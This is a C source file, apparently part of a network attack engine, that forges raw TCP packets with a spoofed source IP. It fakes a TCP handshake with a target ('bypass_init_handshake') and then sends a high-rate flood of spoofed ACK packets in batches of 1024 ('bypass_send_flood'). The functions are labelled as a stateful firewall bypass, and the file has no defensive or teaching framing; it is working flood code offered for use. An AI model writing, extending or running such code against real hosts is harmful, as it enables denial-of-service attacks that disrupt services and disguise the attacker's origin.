#include "../include/engine.h"
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <stdio.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <sys/time.h>

#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wunused-parameter"

struct pseudo_header_t {
    uint32_t source_address;
    uint32_t dest_address;
    uint8_t  placeholder;
    uint8_t  protocol;
    uint16_t tcp_length;
};

static int g_session_count = 0;
static __thread unsigned int sb_rand_state = 0;

static inline unsigned int sb_rand(void) {
    if (sb_rand_state == 0) sb_rand_state = (unsigned int)(time(NULL) ^ (uintptr_t)&sb_rand_state);
    sb_rand_state = sb_rand_state * 1103515245U + 12345U;
    return sb_rand_state;
}

static uint16_t checksum(uint16_t *ptr, int len)
{
    uint32_t sum = 0;

    while (len > 1) {
        sum += *ptr++;
        len -= 2;
    }

    if (len == 1)
        sum += *(uint8_t *)ptr;

    while (sum >> 16)
        sum = (sum & 0xFFFF) + (sum >> 16);

    return (uint16_t)(~sum & 0xFFFF);
}

static int create_raw_socket(void)
{
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        fprintf(stderr, "stateful_bypass: socket(AF_INET, SOCK_RAW): %s\n",
                strerror(errno));
        return -1;
    }

    int optval = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL,
                   &optval, sizeof(optval)) < 0) {
        fprintf(stderr, "stateful_bypass: setsockopt(IP_HDRINCL): %s\n",
                strerror(errno));
        close(sock);
        return -1;
    }

    return sock;
}

static int build_ip_header(uint8_t *buf, uint32_t src_ip, uint32_t dst_ip,
                           int payload_len, int protocol)
{
    struct iphdr *ip = (struct iphdr *)buf;

    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons(payload_len + sizeof(*ip));
    ip->id = htons((uint16_t)(sb_rand() & 0xFFFF));
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = (uint8_t)protocol;
    ip->check = 0;
    ip->saddr = src_ip;
    ip->daddr = dst_ip;
    ip->check = checksum((uint16_t *)ip, sizeof(*ip));

    return sizeof(*ip);
}

static int build_tcp_syn(uint8_t *buf, uint32_t src_ip, uint32_t dst_ip,
                         uint16_t src_port, uint16_t dst_port,
                         uint32_t seq)
{
    struct iphdr *ip = (struct iphdr *)buf;
    struct tcphdr *tcp = (struct tcphdr *)(buf + sizeof(*ip));
    int tcp_len = sizeof(*tcp);
    int ip_len = sizeof(*ip);
    int total_len = ip_len + tcp_len;

    memset(buf, 0, total_len);

    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons((uint16_t)total_len);
    ip->id = htons((uint16_t)(sb_rand() & 0xFFFF));
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_TCP;
    ip->check = 0;
    ip->saddr = src_ip;
    ip->daddr = dst_ip;

    tcp->source = src_port;
    tcp->dest = dst_port;
    tcp->seq = htonl(seq);
    tcp->ack_seq = 0;
    tcp->doff = 5;
    tcp->syn = 1;
    tcp->ack = 0;
    tcp->window = htons(65535);
    tcp->check = 0;
    tcp->urg_ptr = 0;

    struct pseudo_header_t pseudo;
    pseudo.source_address = src_ip;
    pseudo.dest_address = dst_ip;
    pseudo.placeholder = 0;
    pseudo.protocol = IPPROTO_TCP;
    pseudo.tcp_length = htons((uint16_t)tcp_len);

    int psize = sizeof(struct pseudo_header_t) + tcp_len;
    uint8_t *pseudogram = malloc(psize);
    if (!pseudogram)
        return -1;

    memcpy(pseudogram, &pseudo, sizeof(struct pseudo_header_t));
    memcpy(pseudogram + sizeof(struct pseudo_header_t), tcp, tcp_len);
    tcp->check = checksum((uint16_t *)pseudogram, psize);
    free(pseudogram);

    ip->check = checksum((uint16_t *)ip, sizeof(*ip));

    return total_len;
}

static int build_tcp_ack(uint8_t *buf, uint32_t src_ip, uint32_t dst_ip,
                         uint16_t src_port, uint16_t dst_port,
                         uint32_t seq, uint32_t ack_seq)
{
    struct iphdr *ip = (struct iphdr *)buf;
    struct tcphdr *tcp = (struct tcphdr *)(buf + sizeof(*ip));
    int tcp_len = sizeof(*tcp);
    int ip_len = sizeof(*ip);
    int total_len = ip_len + tcp_len;

    memset(buf, 0, total_len);

    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons((uint16_t)total_len);
    ip->id = htons((uint16_t)(sb_rand() & 0xFFFF));
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_TCP;
    ip->check = 0;
    ip->saddr = src_ip;
    ip->daddr = dst_ip;

    tcp->source = src_port;
    tcp->dest = dst_port;
    tcp->seq = htonl(seq);
    tcp->ack_seq = htonl(ack_seq);
    tcp->doff = 5;
    tcp->syn = 0;
    tcp->ack = 1;
    tcp->window = htons(65535);
    tcp->check = 0;
    tcp->urg_ptr = 0;

    struct pseudo_header_t pseudo;
    pseudo.source_address = src_ip;
    pseudo.dest_address = dst_ip;
    pseudo.placeholder = 0;
    pseudo.protocol = IPPROTO_TCP;
    pseudo.tcp_length = htons((uint16_t)tcp_len);

    int psize = sizeof(struct pseudo_header_t) + tcp_len;
    uint8_t *pseudogram = malloc(psize);
    if (!pseudogram)
        return -1;

    memcpy(pseudogram, &pseudo, sizeof(struct pseudo_header_t));
    memcpy(pseudogram + sizeof(struct pseudo_header_t), tcp, tcp_len);
    tcp->check = checksum((uint16_t *)pseudogram, psize);
    free(pseudogram);

    ip->check = checksum((uint16_t *)ip, sizeof(*ip));

    return total_len;
}

EXPORT int bypass_init_handshake(uint32_t target_ip, uint16_t target_port,
                          uint32_t spoof_ip, int sock_raw,
                          uint32_t *seq_out, uint16_t *src_port_out)
{
    int sock = sock_raw;
    int close_sock = 0;
    uint8_t buf[128];
    uint16_t src_port;
    uint32_t seq;
    int ret;

    if (sock < 0) {
        sock = create_raw_socket();
        if (sock < 0)
            return -1;
        close_sock = 1;
    }

    src_port = (uint16_t)(1024 + (sb_rand() % 64511));
    seq = (uint32_t)(sb_rand());

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = target_ip;

    ret = build_tcp_syn(buf, spoof_ip, target_ip, src_port,
                        target_port, seq);
    if (ret < 0) {
        if (close_sock)
            close(sock);
        return -1;
    }

    ret = (int)sendto(sock, buf, (size_t)ret, 0,
                      (struct sockaddr *)&sin, sizeof(sin));
    if (ret < 0) {
        fprintf(stderr, "bypass_init_handshake: sendto(SYN) failed: %s\n",
                strerror(errno));
        if (close_sock)
            close(sock);
        return -1;
    }

    struct timeval tv;
    tv.tv_sec = 1;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    uint8_t recv_buf[4096];
    struct sockaddr_in from;
    socklen_t from_len = sizeof(from);
    int synack_received = 0;
    uint32_t ack_seq = 0;

    for (int attempt = 0; attempt < 2; attempt++) {
        ret = (int)recvfrom(sock, recv_buf, sizeof(recv_buf), 0,
                            (struct sockaddr *)&from, &from_len);
        if (ret < 0) break;
        struct iphdr *recv_ip = (struct iphdr *)recv_buf;
        int ip_hdr_len = recv_ip->ihl * 4;
        if ((uint32_t)ret < (uint32_t)(ip_hdr_len + (int)sizeof(struct tcphdr)))
            continue;
        struct tcphdr *recv_tcp = (struct tcphdr *)(recv_buf + ip_hdr_len);
        if (recv_ip->saddr == target_ip &&
            recv_tcp->source == target_port &&
            recv_tcp->dest == src_port &&
            recv_tcp->syn == 1 && recv_tcp->ack == 1) {
            synack_received = 1;
            ack_seq = ntohl(recv_tcp->seq) + 1;
            break;
        }
    }

    ret = build_tcp_ack(buf, spoof_ip, target_ip, src_port,
                        target_port, seq + 1, ack_seq);
    if (ret < 0) {
        if (close_sock)
            close(sock);
        return -1;
    }

    ret = (int)sendto(sock, buf, (size_t)ret, 0,
                      (struct sockaddr *)&sin, sizeof(sin));
    if (ret < 0) {
        fprintf(stderr, "bypass_init_handshake: sendto(ACK) failed: %s\n",
                strerror(errno));
        if (close_sock)
            close(sock);
        return -1;
    }

    if (seq_out)
        *seq_out = seq + 1;
    if (src_port_out)
        *src_port_out = src_port;

    g_session_count++;

    if (close_sock)
        close(sock);

    return 0;
}

EXPORT int bypass_send_flood(uint32_t target_ip, uint16_t target_port,
                      uint32_t spoof_ip, uint32_t seq,
                      uint16_t src_port, int count, int delay)
{
    int sock = create_raw_socket();
    if (sock < 0) return -1;

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = target_ip;

    struct mmsghdr msgs[1024];
    struct iovec iovecs[1024];
    uint8_t bufs[1024][64];
    int batch;
    int total_sent = 0;

    for (int i = 0; i < count; i += batch) {
        batch = 0;
        while (batch < 1024 && (i + batch) < count) {
            uint32_t current_seq = seq + (uint32_t)((i + batch) * 1);
            int len = build_tcp_ack(bufs[batch], spoof_ip, target_ip,
                                    src_port, target_port, current_seq, seq);
            if (len < 0) break;
            iovecs[batch].iov_base = bufs[batch];
            iovecs[batch].iov_len = len;
            msgs[batch].msg_hdr.msg_name = &sin;
            msgs[batch].msg_hdr.msg_namelen = sizeof(sin);
            msgs[batch].msg_hdr.msg_iov = &iovecs[batch];
            msgs[batch].msg_hdr.msg_iovlen = 1;
            batch++;
        }
        if (batch == 0) continue;
        int off = 0, rem = batch;
        while (rem > 0) {
            int ret = (int)sendmmsg(sock, msgs + off, rem, MSG_DONTWAIT);
            if (ret > 0) { off += ret; rem -= ret; total_sent += ret; }
            else if (errno == EAGAIN || errno == EWOULDBLOCK) continue;
            else break;
        }
    }

    close(sock);
    return total_sent;
}

EXPORT int bypass_session_count(void)
{
    return g_session_count;
}

#pragma GCC diagnostic pop
